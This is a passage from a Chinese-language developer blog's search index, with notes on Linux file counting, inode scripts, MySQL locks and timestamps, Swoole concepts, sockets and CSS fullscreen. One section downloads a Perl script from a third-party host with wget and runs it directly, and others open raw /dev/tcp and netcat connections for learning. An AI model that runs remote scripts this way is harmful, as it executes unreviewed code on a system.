前面可以加 time ，可以算時間 # /path/to/dir 是要傳送檔案目錄 # 5000 傳輸 port tar cvf - /path/to/dir | nc localhost 5000 相同電腦，執行速度 real 4m43.463s user 0m9.270s sys 0m47.256s ","date":"2019-09-27","objectID":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:3:1","tags":["ls","linux"],"title":"Linux ls 大量檔案卡住解決方法","uri":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"zxvf 操作 不會比較快，而且還會卡住…，但其實是完成的。 ","date":"2019-09-27","objectID":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:3:2","tags":["ls","linux"],"title":"Linux ls 大量檔案卡住解決方法","uri":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"大量看檔案數 time perl -e 'opendir D, \".\"; @files = readdir D; closedir D; print scalar(@files).\"\\n\"' #1315029 real 0m0.580s user 0m0.302s sys 0m0.275s – 我這邊測試時間 real 0m1.620s user 0m0.101s sys 0m0.565s 使用time ls -f | wc -l時間好像更快 real 0m0.397s user 0m0.175s sys 0m0.250s 參考: shell - Fast Linux file count for a large number of files - Stack Overflow PERL count files in a dir ","date":"2019-09-27","objectID":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:4:0","tags":["ls","linux"],"title":"Linux ls 大量檔案卡住解決方法","uri":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"找大量使用inode 資料夾 wget http://downinfo.myhostadmin.net/check_inode_counts.txt mv check_inode_counts.txt check_inode_counts.pl perl check_inode_counts.pl / check_inode_counts.pl #!/usr/bin/perl -w use strict; my $threshold=50000; my ($count,$bigdir); sub count_inodes($); sub count_inodes($) { my $dir=shift; return if($count\u003e=$threshold); if(opendir(my $dh,$dir)) { while(defined(my $file=readdir($dh))) { next if ($file eq '.'||$file eq '..'); $count++; my $path=$dir.'/'.$file; count_inodes($path) if (-d $path); } closedir($dh); }else { warn \"couldn't open $dir - $!\\n\"; } } push(@ARGV, '.') unless (@ARGV); while (@ARGV) { my $main=shift; $main.='/' unless($main=~/\\/$/); if(opendir(my $dh, $main)) { while(defined(my $file=readdir($dh))) { $count=0; next if($file eq '.'||$file eq '..'||! -d $main.$file); count_inodes($main.$file); $count=\"\u003e\".$threshold if($count\u003e=$threshold); printf \"%10s\\t%s\\n\", $count, $main.$file; } closedir($dh); } else { warn \"couldn't open $main - $!\\n\"; } } linux系统磁盘block、inode占满处理 - 华为云 ","date":"2019-09-27","objectID":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:5:0","tags":["ls","linux"],"title":"Linux ls 大量檔案卡住解決方法","uri":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"大量檔案看大小 command line - Fast way to display the size of each subdirectory in a directory - Unix \u0026 Linux Stack Exchange One billion files on Linux [LWN.net] linux - Filesystem large number of files in a single directory - Server Fault XFS vs EXT4 | 夏天的风的博客 ","date":"2019-09-27","objectID":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:6:0","tags":["ls","linux"],"title":"Linux ls 大量檔案卡住解決方法","uri":"/blog/posts/Linux-ls-%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E5%8D%A1%E4%BD%8F%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"今天在 log 發現有少數 SQL 會 MySql Lock wait timeout exceeded 網路找幾天文章，先暫時放著 MySql Lock wait timeout exceeded该如何处理？ | 凝雨 - Yun | 快乐编程每一天 - Happy Coding Every Days [心得] 高併發伺服器設定 « Huli’s Blog 谈谈MySQL的锁 - 蹲厕所的熊 在laravel上處理高併發問題 - ScottChayaa mysql transaction default timeout is 50 sec =\u003e my suggestion is between 3 ~ 5 sec 我同事也是建議不要設長 MySQL insert into … select 的锁情况 【转】 - 大树叶 技术专栏 - CSDN博客 MySQL InnoDB 锁等待和锁等待超时的处理 - 简书 資料庫交易的 Isolation - getamis - Medium 對於 MySQL Repeatable Read Isolation 常見的三個誤解 - Chester Chu - Medium [SQL]建立Index來避免DeadLock | 亂馬客 - 點部落 insert into a select * from b 锁问题分析 | 没有伞的孩子必须努力奔跑 ","date":"2019-09-24","objectID":"/blog/posts/MySql-Lock-wait-timeout-exceeded%E5%B0%8F%E8%A8%98/:0:0","tags":["mysql"],"title":"MySql Lock wait timeout exceeded 小記","uri":"/blog/posts/MySql-Lock-wait-timeout-exceeded%E5%B0%8F%E8%A8%98/"},{"categories":["實用工具"],"content":"最近需要做搜尋多個檔案 但又不想把每一個檔案都抓下來 有網路找幾個方法，做個筆記 ","date":"2019-09-23","objectID":"/blog/posts/Linux-%E6%8C%87%E4%BB%A4%E6%90%9C%E5%B0%8B%E5%A4%9A%E5%80%8B%E6%AA%94%E6%A1%88%E5%85%A7%E5%AE%B9/:0:0","tags":["grep","find"],"title":"Linux 指令搜尋多個檔案內容","uri":"/blog/posts/Linux-%E6%8C%87%E4%BB%A4%E6%90%9C%E5%B0%8B%E5%A4%9A%E5%80%8B%E6%AA%94%E6%A1%88%E5%85%A7%E5%AE%B9/"},{"categories":["實用工具"],"content":"Linux 指令方法 find \"path name\" -name \"file name\" -exec grep -H \"search content\" {} \\; Linux搜尋資料夾下的檔案內文：find+grep指令產生器 / Search the Content of Files on Linux: find + grep Command Builder - 布丁布丁吃什麼？ Falldog的程式戰場: [Linux] 搜尋資料夾底下 檔案內部文字 這個指令不是很快(不知道是不是真的資料太多啦XD) 主機指令不想安裝太複雜的程式 所以我就沒試了 ","date":"2019-09-23","objectID":"/blog/posts/Linux-%E6%8C%87%E4%BB%A4%E6%90%9C%E5%B0%8B%E5%A4%9A%E5%80%8B%E6%AA%94%E6%A1%88%E5%85%A7%E5%AE%B9/:1:0","tags":["grep","find"],"title":"Linux 指令搜尋多個檔案內容","uri":"/blog/posts/Linux-%E6%8C%87%E4%BB%A4%E6%90%9C%E5%B0%8B%E5%A4%9A%E5%80%8B%E6%AA%94%E6%A1%88%E5%85%A7%E5%AE%B9/"},{"categories":["實用工具"],"content":"其他工具 4ndrew/filesearcher: File Search experiments danielgatis/search_in_files: This is a tool for search text in files 快速找檔案，但沒有找內容 vishaltelangre/ff: Find files (ff) by name, fast! fzf 也能做到 Make fzf installable by using go get · Issue #801 · junegunn/fzf ","date":"2019-09-23","objectID":"/blog/posts/Linux-%E6%8C%87%E4%BB%A4%E6%90%9C%E5%B0%8B%E5%A4%9A%E5%80%8B%E6%AA%94%E6%A1%88%E5%85%A7%E5%AE%B9/:2:0","tags":["grep","find"],"title":"Linux 指令搜尋多個檔案內容","uri":"/blog/posts/Linux-%E6%8C%87%E4%BB%A4%E6%90%9C%E5%B0%8B%E5%A4%9A%E5%80%8B%E6%AA%94%E6%A1%88%E5%85%A7%E5%AE%B9/"},{"categories":["MySQL"],"content":"以前實作上我都使用 datetime 沒有選過用 timestamp 今天我在找程式問題 後來發現我多年對 timestamp 多年誤解 公司使用 int(10) 當 timestamp 所以我常常在 phpmyadmin 看到數值的東西 最近，剛好跟別的公司合作 剛好有一個資料表設計是 timestamp 由於我在 phpmyadmin 看到 時間格式資料，我以為是 datetime 格式 但我跟另外一個資料表裡面用 datetime 想說時間怎麼對不起來… 後來發現是 timestamp 是使用 unixtime 時間…(這個我知道) 我以為 timestamp 是用數字 現在我知道他也是放時間格式 現在我知道他也是放時間格式 現在我知道他也是放時間格式 另外我實驗這種也能順利存到 DB 去 INSERT INTO test(ts) values(19900101000000); 當然這個時間格式會隨著@@session.time_zone 做改變 set @@session.time_zone = '+08:00'; select * from test; 難怪，之前合作公司說 DB 記得要用 UTC 時間 因為這個主機上面有很多人在用，為了方便時間亂掉 不過使用 timestamp 方式相信做多國跨域網站真的會比較方便!! ","date":"2019-09-23","objectID":"/blog/posts/MySQL-%E6%88%91%E5%B0%8D-timestamp-%E5%A4%9A%E5%B9%B4%E7%9A%84%E8%AA%A4%E8%A7%A3/:0:0","tags":["mysql"],"title":"MySQL 我對 timestamp 多年的誤解","uri":"/blog/posts/MySQL-%E6%88%91%E5%B0%8D-timestamp-%E5%A4%9A%E5%B9%B4%E7%9A%84%E8%AA%A4%E8%A7%A3/"},{"categories":["PHP"],"content":"最近一時衝動報名 swoole 課程 我對高併發實作還滿感興趣 好奇怎麼運用一些方法解決 今天看了 學習Swoole需要掌握哪些基礎知識-Swoole-Swoole文檔中心 發現裡面很多名詞不會 不想浪費錢，趕快臨時抱佛腳 本篇是我找來資訊，看到的內容打成自己的感想，所以也不是很正確的東西，反正是我自己筆記!! ","date":"2019-09-20","objectID":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/:0:0","tags":["swoole","php"],"title":"swoole 需要學習前了解一些東西整理小記","uri":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"多進程/多線程 多年來有看到執行緒跟多程序執行的差別，今天終於可以好好的想一下 ","date":"2019-09-20","objectID":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/:1:0","tags":["swoole","php"],"title":"swoole 需要學習前了解一些東西整理小記","uri":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"程序 與 執行緒差別 其實很久以前有想這個問題，但一直沒有找解答 我有想出兩個差別，可以共用全域變數，另外一個不行 今天我又有更多想法，多程序吃的記憶體資源會比多執行緒吃的多 畢竟1個 electron 跟開 1000 個 electron 是有差的… 但我看到還有一個答案，就是多執行緒可以等待結束在進行下一個動作 詳細可看Program/Process/Thread 差異 - Po-Ching Liu - Medium fork 子程序 前陣子看了鳥哥鳥哥的 Linux 私房菜 – 第十六章、程序管理與 SELinux 初探這篇 看不太懂 fork and exec：程序呼叫的流程 上課講到用 PHP 寫子程序 \u003c?php $pid = pcntl_fork(); //在這裡開始產生程式的分岔 ##** if ($pid == -1) { die('無法產生子程序'); } else if ($pid) { // 父程序會進入這裡 } else { // 子程序會進入這裡 } 做到上面##** 註解這行 它會做fork 主程序，也就是複製整份主程序記憶體所有程式內容 複製出來並不會跟主程序做關聯(會獨立出來) 變數更動不影響別的子程序和父程序 但沒法用一般 kill 指令調 一般正常可以 PHP: posix_setsid - Manual ","date":"2019-09-20","objectID":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/:1:1","tags":["swoole","php"],"title":"swoole 需要學習前了解一些東西整理小記","uri":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"瞭解進程間通信的基本知識，如管道、UnixSocket、消息隊列、共享內存 這個我就沒特別找了 TCP/UDP的接收緩衝區和發送緩衝區 - Swallow_he的博客 - CSDN博客 一個故事告訴你什麼是消息隊列 · jasonGeng88/blog 进程间的通信方式（一）：共享内存 - 知乎 ","date":"2019-09-20","objectID":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/:1:2","tags":["swoole","php"],"title":"swoole 需要學習前了解一些東西整理小記","uri":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"SOCKET 瞭解SOCKET的基本操作如accept/connect、send/recv、close、listen、bind 瞭解SOCKET的接收緩存區、發送緩存區、阻塞/非阻塞、超時等概念 之前我有在 Java 書看到使用 socket 搭配執行緒做連線溝通 但沒有深入了解裡面原理 你一直聽到人家在講 “sockets”，你可能也想知道這些是什麼東西。 好的，其實它們就是：＂利用標準 UNIX file descriptors（檔案描述符）與其它程式溝通的一種方式＂。 02-何謂 Socket - Beej’s Guide to Network Programming 正體中文版 ","date":"2019-09-20","objectID":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/:2:0","tags":["swoole","php"],"title":"swoole 需要學習前了解一些東西整理小記","uri":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"file descriptors(fd) 這邊有講到 file descriptors (fd) 後面會講到這個 簡單說 就是 0 標準輸出(stdout) 1 標準輸入(stdin) 2 標準錯誤(stderr) 一些重要的I/O導向: \u003e 重新導向並且先把檔案虧空(我真是敗家子:-)) \u003e\u003e 把結果導向並且append到檔案後 \u003c 重新導向standard input \u003e\u0026n 把standard out丟給file descriptor n \u003c\u0026n 從file descriptor n拿東西給standard in \u003e\u0026- close standard out \u003c\u003c\\text 把stanadard in導向，直到讀到text為止。 File descriptor與I/O導向 @ 程式專欄 :: 隨意窩 Xuite日誌 fd更狂的應用可以看阿旺的 Linux 開竅手冊-file descriptor 我都不知道/proc/xxxx/fd可以看到所有應用程式 stdin / stdout / stderr 檔案 # 取得cmd 的 PID echo $$; cd /proc/$$/fd/ ls -la 可以看到標準輸入輸出會寫在哪裡 當然裡還還有更多東西，目前先提到這樣 突然想到當初大學上 Linux 時候，老師講 Linux 裡面的東西都可以在檔案找到 回憶の隨筆日記: 檔案描述符 (file descriptor) 簡單應用分析 Socket-IO复用技术-SherryX-51CTO博客 檔案描述符 - 維基百科，自由的百科全書 ","date":"2019-09-20","objectID":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/:2:1","tags":["swoole","php"],"title":"swoole 需要學習前了解一些東西整理小記","uri":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"socket 跟 fd 關係? 其實我以前看 socket 是傳訊息用的，想說他怎麼會跟 fd 有關係 bash 可以用 socket # 開啟連線至 Google 網頁的 socket exec 3\u003c\u003e/dev/tcp/www.google.com.tw/80 # 送出 HTTP 請求 echo -e \"GET / HTTP/1.1\\n\\n\" \u003e\u00263 # 接收網頁內容，1 秒後自動停止接收資料 timeout 1 cat \u003c\u00263 # 關閉輸入與輸出 socket exec 3\u003c\u0026- exec 3\u003e\u0026- 這時候可以去看 /dev/xxx/fd/3 可以看到這個檔案 不過我不確定別的程式語言建立 socket 會不會產生這個檔案?? 我使用 php -S 0.0.0.0:80 建立簡單的 Server 使用ps aux | grep php 看 PID 進入 /proc/{PID}/fd/ 使用 ls -l 可以看到一些檔案參照 socket 但是怎麼知道是輸入還是輸出，我就沒深入研究 所以我研判是 socket 跟 fd 是有關係的(應該 = =a) Bash 程式設計教學：開啟 TCP/UDP Socket 網路連線 - G. T. Wang Bash shell 連接 Socket 寫法 | Tsung’s Blog 我發現 zsh 不能實作，要在 bash 裡面一條一條執行才可以 用成 xxx.sh 不能跑，目前沒有深入找這個問題 這讓我想以前 TCP 概論課程有用 telnet 實作 接收 yahoo 網頁 這上面範例應該是 Linux 方法!! ","date":"2019-09-20","objectID":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/:2:2","tags":["swoole","php"],"title":"swoole 需要學習前了解一些東西整理小記","uri":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"accept/connect、send/recv、close、listen、bind 簡單小記一些 function 作用 socket() 建立 socket 用的 fd bind() socket() 傳回來的 fd 放在 bind 命名 listen() 監聽 socket，但重頭戲在 accept，需要下 accept() 別人才能練近來 accept() 接受別人連線，等 client 發 connect connect() client 發起連線 send() , recv() write read TCP?? sendto() , recvfrom() write read UDP close 關閉連線 首先，Server 會接收到 Client 資料，所以一開始 Server 會先做 read，確定收到資料才會做 write 簡單來講把這個想成 http 就好理解。話說 http 也是 socket o.\u003c 想到這個我想想 socket 有沒有跟 https 憑證加密? 不過網路上查了一下，沒有看到。都是額外用 function library 加密 但也不是不能理解，畢竟 socket 介於 應用層 和 傳輸層中間 當然有找到使用 openssl ，不過沒有看到別的程式語言用 socket编程之openssl入门 - 我们的征途是星辰大海 - CSDN博客 Java实现 SSL双向认证 Socket – Huang Shiyang TLS Socket , client \u0026 server in NodeJS - Morioh 1.7.4 SSL隧道加密TCP-Server-Swoole-Swoole文档中心 看來還是真的有的… 題外話:我好奇 socket 是網路7層哪一層，裡面有寫Socket 的哩哩扣扣 « Mark Lin Blog 更多資訊 TCP Socket Programming 學習筆記 | 雷德麥的藏書閣 Beej’s Guide to Network Programming 正體中文版 · GitBook (Legacy) 其實在看 io 複用一直在想為什麼要了解 socket 原來是大有關係，目前我猜測應該是 socket 並非最佳連線，所以才有 io 複用那些解決方案 到下面幾篇有很多都不是很了解，我盡量吸收 ","date":"2019-09-20","objectID":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/:2:3","tags":["swoole","php"],"title":"swoole 需要學習前了解一些東西整理小記","uri":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"接收緩存區、發送緩存區、阻塞/非阻塞、超時等概念 UDP Socket(套接字)——发送接收缓冲区 - 简书 ","date":"2019-09-20","objectID":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/:2:4","tags":["swoole","php"],"title":"swoole 需要學習前了解一些東西整理小記","uri":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"IO复用 聊聊IO多路复用之select、poll、epoll详解 - 簡書 說真的我以為講到 IO 應該就會講到硬碟… 結果都是講 socket 東西 看來這個才是基礎… 這一塊我不是很了解 簡單看到是在 epoll 比 select 還快 是用監聽事件觀念 這也是為什麼大家推使用 epoll 的 nginx epoll相关基础知识 | 笔记本 ","date":"2019-09-20","objectID":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/:3:0","tags":["swoole","php"],"title":"swoole 需要學習前了解一些東西整理小記","uri":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"同步、異步、阻塞、非阻塞 聊聊同步、异步、阻塞与非阻塞 - 簡書 看裡面的內容，會覺得同步和阻塞不會分辨 我就突然想到 js 的 ajax 是異步，那這個會是阻塞還是不是阻塞? 答案是異步非阻塞 JS 同步、異步、阻塞、非阻塞 - Sam - Medium 可以看上面連結 寫的還滿清楚的 ","date":"2019-09-20","objectID":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/:3:1","tags":["swoole","php"],"title":"swoole 需要學習前了解一些東西整理小記","uri":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"LINUX IO 聊聊Linux 五种IO模型 - 簡書 ","date":"2019-09-20","objectID":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/:3:2","tags":["swoole","php"],"title":"swoole 需要學習前了解一些東西整理小記","uri":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"應用 Swoole的简单运用 - 知乎 看了這麼多還不是很了解，暫時整理到這邊…orz 2019-10-26 課程小記 Swoole Server HTTP/Websocket Server Task 異步任務 這一快很像 MQ，但要可靠可以用 Timer 定時器 Memory 模組 講者有提到這邊可以做 Memory Cache Memory Cache 可在 Redis 前面可做緩衝 減輕Redis 負擔 剛好網路上有找到 Github GitHub - swooliy/memory-cache: Memory Cache base on swoole Process Coroutine 更新 swoole 程式必須要重啟? 需要。但現在有 Docker , K8s 機器所以做更新程式，服務不會中斷 但是 websocket 還是會斷 所以必須要做 websocket 重新連線機制 Websocket 要做 load balance 需要做一個 main server 關聯所有 Websocket Server 溝通橋梁 所有近來不是透過 main server 去做送 而是自動直接 load balance 進去到 Websocket Server 要透過發送訊息是 main server 做發送給所有 Websocket Server 去做實作 main Server 雖然沒有講到要用什麼 但我覺得 MQ(RabbitMQ) 用在這上面也是非常不錯的方法 課程有提到 socket.io 跟 websocket 不太一樣 socket.io 有對非支援 websocket 瀏覽器的處理 f ","date":"2019-09-20","objectID":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/:4:0","tags":["swoole","php"],"title":"swoole 需要學習前了解一些東西整理小記","uri":"/blog/posts/swoole-%E9%9C%80%E8%A6%81%E5%AD%B8%E7%BF%92%E5%89%8D%E4%BA%86%E8%A7%A3%E4%B8%80%E4%BA%9B%E6%9D%B1%E8%A5%BF%E6%95%B4%E7%90%86%E5%B0%8F%E8%A8%98/"},{"categories":["CSS"],"content":"最近看到 CSS 可以控制全螢幕 style 簡單測試一下 還是有遇到一些小地雷 小記小記，防止下次彩雷 ","date":"2019-09-19","objectID":"/blog/posts/CSS-fullscreen-%E5%85%A8%E8%9E%A2%E5%B9%95%E5%8A%9F%E8%83%BD%E5%B0%8F%E8%A8%98/:0:0","tags":["css","fullscreen"],"title":"CSS :fullscreen 全螢幕功能小記","uri":"/blog/posts/CSS-fullscreen-%E5%85%A8%E8%9E%A2%E5%B9%95%E5%8A%9F%E8%83%BD%E5%B0%8F%E8%A8%98/"},{"categories":["CSS"],"content":":fullscreen 是控制 CSS style ，不是控制畫面全螢幕，但這個對F11全螢幕沒有什麼作用 ","date":"2019-09-19","objectID":"/blog/posts/CSS-fullscreen-%E5%85%A8%E8%9E%A2%E5%B9%95%E5%8A%9F%E8%83%BD%E5%B0%8F%E8%A8%98/:1:0","tags":["css","fullscreen"],"title":"CSS :fullscreen 全螢幕功能小記","uri":"/blog/posts/CSS-fullscreen-%E5%85%A8%E8%9E%A2%E5%B9%95%E5%8A%9F%E8%83%BD%E5%B0%8F%E8%A8%98/"},{"categories":["CSS"],"content":"JS 觸發全螢幕 document.documentElement.requestFullscreen() 這邊注意使用CSS要用:fullscreen or html:fullscreen 使用body:fullscreen ","date":"2019-09-19","objectID":"/blog/posts/CSS-fullscreen-%E5%85%A8%E8%9E%A2%E5%B9%95%E5%8A%9F%E8%83%BD%E5%B0%8F%E8%A8%98/:2:0","tags":["css","fullscreen"],"title":"CSS :fullscreen 全螢幕功能小記","uri":"/blog/posts/CSS-fullscreen-%E5%85%A8%E8%9E%A2%E5%B9%95%E5%8A%9F%E8%83%BD%E5%B0%8F%E8%A8%98/"},{"categories":["CSS"],"content":"地雷 ","date":"2019-09-19","objectID":"/blog/posts/CSS-fullscreen-%E5%85%A8%E8%9E%A2%E5%B9%95%E5%8A%9F%E8%83%BD%E5%B0%8F%E8%A8%98/:3:0","tags":["css","fullscreen"],"title":"CSS :fullscreen 全螢幕功能小記","uri":"/blog/posts/CSS-fullscreen-%E5%85%A8%E8%9E%A2%E5%B9%95%E5%8A%9F%E8%83%BD%E5%B0%8F%E8%A8%98/"},{"categories":["CSS"],"content":"開發者模式不能直接執行 在 console.log 實作不會有效果 會跑出錯誤 TypeError: The expression cannot be converted to return the specified type. document.documentElement.requestFullscreen() ","date":"2019-09-19","objectID":"/blog/posts/CSS-fullscreen-%E5%85%A8%E8%9E%A2%E5%B9%95%E5%8A%9F%E8%83%BD%E5%B0%8F%E8%A8%98/:3:1","tags":["css","fullscreen"],"title":"CSS :fullscreen 全螢幕功能小記","uri":"/blog/posts/CSS-fullscreen-%E5%85%A8%E8%9E%A2%E5%B9%95%E5%8A%9F%E8%83%BD%E5%B0%8F%E8%A8%98/"},{"categories":["CSS"],"content":"相關其他 JS 套件 [前端軍火庫]screenfull.js - 全螢幕顯示就是這麼簡單 | 全端開發人員天梯 - 點部落 sindresorhus/screenfull.js: Simple wrapper for cross-browser usage of the JavaScript Fullscreen API ","date":"2019-09-19","objectID":"/blog/posts/CSS-fullscreen-%E5%85%A8%E8%9E%A2%E5%B9%95%E5%8A%9F%E8%83%BD%E5%B0%8F%E8%A8%98/:4:0","tags":["css","fullscreen"],"title":"CSS :fullscreen 